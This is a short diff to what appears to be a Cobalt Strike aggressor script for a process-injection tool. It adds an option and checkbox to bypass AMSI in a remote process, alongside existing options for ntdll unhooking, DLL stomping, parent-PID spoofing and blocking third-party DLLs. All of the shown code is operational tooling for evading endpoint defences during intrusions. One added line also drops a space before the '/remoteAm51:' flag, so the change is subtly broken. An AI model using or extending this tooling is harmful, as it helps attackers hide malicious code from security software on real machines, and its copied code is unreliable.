@@ -74,6 +74,10 @@ sub dinject {
         $cmd .= " /am51:True";
     }
 
+    if (%options["remoteAm51"] eq "true") {
+        $cmd .= " /remoteAm51:True";
+    }
+
     if (%options["unhook"] eq "true") {
         $cmd .= " /unhook:True";
     }
@@ -86,7 +90,8 @@ sub dinject {
          . " /timeout:" . %options["timeout"] . " /flipSleep:" . %options["flipSleep"] . " /image:" . %options["image"]
          . " /pid:" . %options["pid"] . " /ppid:" . %options["ppid"] . " /dll:" . %options["dll"]
          . " /stompDll:" . %options["stompDll"] . " /stompExport:" . %options["stompExport"] . " /sleep:" . %options["sleep"]
-         . " /blockDlls:" . %options["blockDlls"] . " /am51:" . %options["am51"] . " /unhook:" . %options["unhook"]);
+         . " /blockDlls:" . %options["blockDlls"] . " /am51:" . %options["am51"] . "/remoteAm51:" . %options["remoteAm51"]
+         . " /unhook:" . %options["unhook"]);
 }
 
 sub gen_random_string {
@@ -168,9 +173,10 @@ popup beacon_bottom {
         drow_text($dialog, "stompExport", "Exported function name to overwrite:");
         drow_text($dialog, "sleep",       "Number of seconds (approx.) to sleep before execution (10s-60s)");
 
-        drow_checkbox($dialog, "blockDlls", "DLLs:",   "Block 3rd-party DLLs");
-        drow_checkbox($dialog, "am51",      "AMSI:",   "Bypass AMSI for current process");
-        drow_checkbox($dialog, "unhook",    "Unhook:", "Unhook ntdll.dll");
+        drow_checkbox($dialog, "blockDlls",  "DLLs:",          "Block 3rd-party DLLs");
+        drow_checkbox($dialog, "am51",       "AMSI (local):",  "Bypass AMSI in current process");
+        drow_checkbox($dialog, "remoteAm51", "AMSI (remote):", "Bypass AMSI in remote process");
+        drow_checkbox($dialog, "unhook",     "Unhook:",        "Unhook ntdll.dll");
 
         dbutton_action($dialog, "Inject");
 
